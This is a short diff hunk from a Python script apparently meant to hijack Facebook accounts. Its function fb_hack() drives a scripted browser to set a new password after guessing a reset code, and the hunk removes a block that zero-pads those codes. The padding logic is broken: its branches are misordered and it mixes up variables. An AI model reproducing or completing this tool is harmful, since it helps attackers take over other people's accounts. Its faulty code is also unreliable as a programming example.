@@ -226,33 +226,3 @@ def fb_hack():
       browser.select_form(nr=0)
       browser.form['password_new'] = new
 fb_hack()
-if reset < 10000000:
-  h = ""
-  code = ("0", str(y))
-  y = h.join(code)
-elif reset < 1000000:
-  h = ""
-  code = ("00", str(y))
-  y = h.join(code)
-elif reset < 100000:
-  h = ""
-  code = ("000", str(y))
-  y = h.join(code)
-elif reset < 10000:
-  h = ""
-  code = ("0000", str(y))
-  y = h.join(code)
-elif reset < 1000:
-  h = ""
-  code = ("00000", str(y))
-  y = h.join(code)
-elif reset < 100:
-  h = ""
-  code = ("000000", str(y))
-  y = h.join(code)
-elif reset < 10:
-  h = ""
-  code = ("00000000", str(y))
-  y = h.join(code)
-else:
-  
